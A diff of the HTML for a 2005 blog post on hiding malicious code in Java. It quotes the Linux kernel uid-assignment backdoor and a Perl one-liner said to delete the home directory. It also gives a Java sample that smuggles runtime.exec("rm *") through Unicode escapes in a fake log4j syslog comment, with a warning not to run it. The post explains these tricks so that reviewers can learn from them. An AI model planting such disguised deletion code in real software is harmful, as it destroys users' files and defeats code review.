@@ -1,10 +1,20 @@
-<!DOCTYPE html>
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="utf-8">
 
-<html lang="en">
-<head>
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="Joe Walker">
+
+  <link href="http://incompleteness.me/blog/atom.xml" rel="alternate" title="Incompleteness" type="application/atom+xml">
+  <link href="http://incompleteness.me/favicon.png" rel="shortcut icon">
+  <link href="http://incompleteness.me/styles/normalize.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="http://incompleteness.me/styles/blog.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="http://incompleteness.me/styles/twitter.css" media="screen, projection" rel="stylesheet" type="text/css">
+
+  <link rel="canonical" href="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/">
+
   <title>Writing malicious code in Java - Incompleteness</title>
-  <link rel="canonical" href="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/" />
-  <meta name="author" content="Joe Walker" /><link href="http://incompleteness.me/blog/atom.xml" rel="alternate" title="Incompleteness" type="application/atom+xml" /><link href="http://incompleteness.me/favicon.png" rel="shortcut icon" /><link href="http://incompleteness.me/styles/normalize.css" media="screen, projection" rel="stylesheet" type="text/css" /><link href="http://incompleteness.me/styles/blog.css" media="screen, projection" rel="stylesheet" type="text/css" /><link href="http://incompleteness.me/styles/twitter.css" media="screen, projection" rel="stylesheet" type="text/css" /><meta charset="utf-8" /><meta name="HandheldFriendly" content="True" /><meta name="MobileOptimized" content="320" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 </head>
 
 <body>
@@ -14,8 +24,8 @@
   </ul>
   <form action="http://google.com/search" method="get">
     <fieldset role="site-search">
-      <input type="hidden" name="q" value="site:incompleteness.me" />
-      <input class="search" type="text" name="q" results="0" placeholder="Search" />
+      <input type="hidden" name="q" value="site:incompleteness.me">
+      <input class="search" type="text" name="q" results="0" placeholder="Search">
     </fieldset>
   </form>
   <ul role="main-navigation">
@@ -25,20 +35,22 @@
 
   <div id="main">
     <article>
-      <h1><a href="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/">Writing malicious code in Java</a></h1><section class="content"><p>The <a href="http://www.brainhz.com/underhanded">underhanded C contest</a> is all about writing C code that looks innocent enough to get past a security review, but does something nasty on the side. It got me thinking about how to subvert things in Java.</p><p>Somewhat predictably the C contest was dominated by a small number of tricks:</p><img align="right" src="http://incompleteness.me/images/posts/malicious-code-1.jpg" /><ul>
+
+      <h1><a href="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/">Writing malicious code in Java</a></h1>
+
+      <section class="content"><p>The <a href="http://www.brainhz.com/underhanded">underhanded C contest</a> is all about writing C code that looks innocent enough to get past a security review, but does something nasty on the side. It got me thinking about how to subvert things in Java.</p><p>Somewhat predictably the C contest was dominated by a small number of tricks:</p><img align="right" src="../images/posts/malicious-code-1.jpg"><ul>
 <li>Buffer overflow</li>
 <li>Array bounds violation</li>
 <li>Getting = and == the wrong way around</li>
-</ul><p>Java neatly sidesteps the first 2 by doing the checking for you. It’s kind of silly that we’re still fighting those 2 issues something like 30 years since they were first identified as being serious problems.</p><p>Java does a lot to shut down the =/== confusion by refusing to silently convert to a boolean. So Java programmers are a lot safer there too. Some code <a href=" http://www.ussg.iu.edu/hypermail/linux/kernel/0311.0/0635.html">nearly got into the Linux kernel</a> containing a just such a back-door:</p><pre>
-if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: red;"><b>=</b></span> 0))
+</ul><p>Java neatly sidesteps the first 2 by doing the checking for you. It’s kind of silly that we’re still fighting those 2 issues something like 30 years since they were first identified as being serious problems.</p><p>Java does a lot to shut down the =/== confusion by refusing to silently convert to a boolean. So Java programmers are a lot safer there too. Some code <a href=" http://www.ussg.iu.edu/hypermail/linux/kernel/0311.0/0635.html">nearly got into the Linux kernel</a> containing a just such a back-door:</p><pre>if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-&gt;uid <span style="color:red;"><b>=</b></span> 0))
     retval = -EINVAL;
-</pre><p>The net effect was to become root rather than check you are root. Oops.</p><p><b>Java's Strengths: High alpha to punctuation ratio</b></p><p>Some languages resemble line noise, and consequently can be very hard to understand. Perl would be the obvious culprit. I’m told that the following will delete your home directory:</p><pre>perl -e '$??s:;s:s;;$?::s;;=]=%-{</pre><p>(I read it on Slashdot so it must be true. Of course I know you’re not going to test it out either so I could have just written rubbish above and no-one would know.)</p><p>Any language with a low alpha to punctuation ratio has plenty of scope for hiding malicious code in amongst innocent code. This is one of the reasons why generics has got a bad press – it lowers Java's alpha to punctuation ratio. It’s also the reason why I’m not too keen on regexs.</p><p><b>Java's Strengths: Security Manager</b></p><p>We perhaps ought to use this more than we do. I would guess that the vast majority of Java installations do not use the SecurityManager even in institutions that have high security requirements and don't particularly like trusting their programmers.</p><p><b>Java's Weaknesses</b></p><p>Java does have weaknesses, and the code below shows one of them.</p><p>I thought about using the trick of making immutable strings become <a href="http://incompleteness.me/blog/2005/05/26/java-lang-string-is-not-immutable/">mutable</a> but decided there was a better way.</p><p>So here is my attempt at hiding malicious code using Java. It should be fairly obvious that the byte array contains "rm *" (which will delete all the files from the current directory on Unix) so that bit isn't well hidden. I guess I'd need to hide that bit away somewhere. The question is how did I subvert things so that the byte array at the bottom actually gets passed into the runtime.exec() at the top?</p><p>Since the code is Unix specific, on Windows I get the error message: "<code>java.io.IOException: CreateProcess: rm * error=2</code>":</p><img src="http://incompleteness.me/images/posts/malicious-code-2.png" /><p>DO NOT RUN THIS CODE UNLESS YOU REALLY WANT TO DELETE RANDOM FILES FROM YOUR COMPUTER. THE CODE BELOW IS MALICIOUS BUT IT IS DESIGNED TO LOOK INNOCENT.</p><style type="text/css">
+</pre><p>The net effect was to become root rather than check you are root. Oops.</p><p><b>Java's Strengths: High alpha to punctuation ratio</b></p><p>Some languages resemble line noise, and consequently can be very hard to understand. Perl would be the obvious culprit. I’m told that the following will delete your home directory:</p><pre>perl -e '$??s:;s:s;;$?::s;;=]=&gt;%-{&lt;-|}&lt;&amp;|`{;;y;
+ -/:-@[-`{-};`-{~" -;;s;;$_;see'</pre><p>(I read it on Slashdot so it must be true. Of course I know you’re not going to test it out either so I could have just written rubbish above and no-one would know.)</p><p>Any language with a low alpha to punctuation ratio has plenty of scope for hiding malicious code in amongst innocent code. This is one of the reasons why generics has got a bad press – it lowers Java's alpha to punctuation ratio. It’s also the reason why I’m not too keen on regexs.</p><p><b>Java's Strengths: Security Manager</b></p><p>We perhaps ought to use this more than we do. I would guess that the vast majority of Java installations do not use the SecurityManager even in institutions that have high security requirements and don't particularly like trusting their programmers.</p><p><b>Java's Weaknesses</b></p><p>Java does have weaknesses, and the code below shows one of them.</p><p>I thought about using the trick of making immutable strings become <a href="http://incompleteness.me/blog/2005/05/26/java-lang-string-is-not-immutable/">mutable</a> but decided there was a better way.</p><p>So here is my attempt at hiding malicious code using Java. It should be fairly obvious that the byte array contains "rm *" (which will delete all the files from the current directory on Unix) so that bit isn't well hidden. I guess I'd need to hide that bit away somewhere. The question is how did I subvert things so that the byte array at the bottom actually gets passed into the runtime.exec() at the top?</p><p>Since the code is Unix specific, on Windows I get the error message: "<code>java.io.IOException: CreateProcess: rm * error=2</code>":</p><img src="../images/posts/malicious-code-2.png"><p>DO NOT RUN THIS CODE UNLESS YOU REALLY WANT TO DELETE RANDOM FILES FROM YOUR COMPUTER. THE CODE BELOW IS MALICIOUS BUT IT IS DESIGNED TO LOOK INNOCENT.</p><style type="text/css">
 .keyword { color:#7F0055; }
 .commnt  { color:#3F7F5F; }
 .string  { color:#2A00FF; }
 .answer  { color:white; }
-</style><pre>
-<span class="keyword">import</span> java.io.OutputStream;
+</style><pre><span class="keyword">import</span> java.io.OutputStream;
 <span class="keyword">import</span> java.net.Socket;
 
 <span class="keyword">public</span> <span class="keyword">class</span> Test {
@@ -63,7 +75,9 @@ if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: r
       <span class="commnt">/*
        * Syslog code borrowed from log4j  by Ceki Gulc\u00FC
        * Network syslog calls must begin  with the following byte sequence:
-       * \u002A\u002F \u0072 \u002E  \u0065\u0078\u0065c (\u0022 \u0072\u006D \u002A \u0022) \u003B \u002F\u002A</span>
+       * \u002A\u002F \u0072 \u002E  \u0065\u0078\u0065c (\u0022 \u0072\u006D \u002A \u0022) \u003B \u002F\u002A&lt;
+       * followed by the message. For  more information see:
+       *  http://cvs.apache.org/viewcvs.cgi/logging-log4j/src/java/org/apache/log4j/net/SyslogConstants.java?view=markup</span>
        */
       Socket socket = <span class="keyword">new</span> Socket(<span class="string">"loghost"</span>, 514);
       OutputStream out = socket.getOutputStream();
@@ -72,19 +86,24 @@ if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: r
     }
   }
 }
-</pre></section><section class="meta">
-  <span class="byline author vcard">
-    Posted by <span class="fn">Joe Walker</span>
-  </span>
-  <time datetime="2005-09-28T08:00:16+00:00" pubdate="pubdate">
-    <span class="day">28</span>
-    <span class="month">Sep</span>
-    <span class="year">2005</span>
-  </time>
-</section><section class="sharing">
-  <a href="http://twitter.com/share" class="twitter-share-button" data-via="joewalker" data-url="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/" data-counturl="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/">Tweet</a>
-  <div class="g-plusone" data-size="medium"></div>
-</section>
+</pre></section>
+
+      <section class="meta">
+        <span class="byline author vcard">
+          Posted by <span class="fn">Joe Walker</span>
+        </span>
+        <time datetime="2005-09-28T08:00:16+00:00" pubdate="">
+          <span class="day">28</span>
+          <span class="month">Sep</span>
+          <span class="year">2005</span>
+        </time>
+      </section>
+
+      <section class="sharing">
+        <a href="http://twitter.com/share" class="twitter-share-button" data-via="joewalker" data-url="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/" data-counturl="http://incompleteness.me/blog/2005/09/28/writing-malicious-code-in-java/">Tweet</a>
+        <div class="g-plusone" data-size="medium"></div>
+      </section>
+
       <section class="comments">
         <h2>Comments</h2>
         
@@ -104,15 +123,15 @@ if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: r
   <h2>Incompleteness</h2>
 
   <p>
-    <a href="http://incompleteness.me/blog/" style="float: right;">
-      <img src="http://incompleteness.me/images/rss_icon.png" />
+    <a href="http://incompleteness.me/blog/" style="float:right">
+      <img src="http://incompleteness.me/images/rss_icon.png">
     </a>
     The <a href="http://incompleteness.me/blog/">blog</a> is about general web development.
     (<a href="http://incompleteness.me/blog/atom.xml">Atom feed</a>)
   </p>
   <p>
-    <a href="http://incompleteness.me/mozblog/" style="float: right;">
-      <img src="http://incompleteness.me/images/firefox_40.png" />
+    <a href="http://incompleteness.me/mozblog/" style="float:right">
+      <img src="http://incompleteness.me/images/firefox_40.png">
     </a>
     <a href="http://incompleteness.me/mozblog/">MozBlog</a> contains Mozilla stuff - i.e
     stuff for <a href="http://planet.mozilla.org/">planet</a>
@@ -123,8 +142,8 @@ if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: r
     See also the <a href="http://incompleteness.me/blog/archives/">Archives</a>
   </p>
   <p>
-    If it's a choice between<br />
-    incomplete or wrong,<br />
+    If it's a choice between<br>
+    incomplete or wrong,<br>
     side with <a href="http://en.wikipedia.org/wiki/G%C3%B6del%27s_incompleteness_theorems">Gödel</a>.
   </p>
 
@@ -167,6 +186,8 @@ if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: r
   <h2>Recent Posts</h2>
   <ul id="recent_posts">
     <li class="post">
+      <a href="http://incompleteness.me/blog/2015/02/09/console-dot-mihai/">console.mihai();</a>
+    </li><li class="post">
       <a href="http://incompleteness.me/blog/2014/04/24/combatting-self-xss-part-2/">Combatting Self-XSS (Part 2)</a>
     </li><li class="post">
       <a href="http://incompleteness.me/blog/2013/03/07/work-for-mozilla-building-developer-tools/">Work for Mozilla building Developer Tools</a>
@@ -184,8 +205,6 @@ if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: r
       <a href="http://incompleteness.me/blog/2010/09/13/marketing-according-to-the-browser-makers/">Marketing (according to the browser makers)</a>
     </li><li class="post">
       <a href="http://incompleteness.me/blog/2010/02/01/apple-and-adobe-obituaries-and-idealism/">Apple and Adobe, Obituaries and Idealism</a>
-    </li><li class="post">
-      <a href="http://incompleteness.me/blog/2009/08/13/collaboration-in-bespin/">Collaboration in Bespin</a>
     </li>
   </ul>
 </section>
@@ -213,7 +232,7 @@ if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: r
     Copyright © 2011 - Joe Walker -
     <span class="credit">Powered by <a href="https://github.com/joewalker/jspress/">JSPress</a></span>
   </p>
-</footer><script type="text/javascript">
+</footer><script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script><script type="text/javascript">
   (function() {
     var script = document.createElement('script');
     script.type = 'text/javascript';
@@ -231,5 +250,6 @@ if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-uid <span style="color: r
     document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
   })();
 </script>
-</body>
-</html>
+
+
+</body></html>
